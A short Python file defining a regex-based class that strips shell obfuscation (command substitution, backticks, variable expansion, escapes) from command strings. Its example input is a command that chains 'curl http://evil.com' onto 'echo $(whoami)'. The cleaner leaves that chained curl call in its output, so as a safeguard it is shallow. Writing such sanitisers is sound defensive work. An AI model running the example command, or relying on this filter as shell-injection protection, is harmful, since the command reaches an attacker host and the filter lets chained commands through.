import re

class ShellObfuscationCleaner:
    def __init__(self):
        self.patterns = [
            r"\$\(.*?\)",      # command substitution
            r"\`",             # backtick execution
            r"\$\{.*?\}",      # variable expansion
            r"\\[tnr]"         # escaped characters
        ]

    def clean(self, command: str) -> str:
        for pattern in self.patterns:
            command = re.sub(pattern, '', command)
        return command.strip()

# Example usage
if __name__ == "__main__":
    cmd = 'echo $(whoami) && curl http://evil.com'
    cleaner = ShellObfuscationCleaner()
    print("Cleaned:", cleaner.clean(cmd))
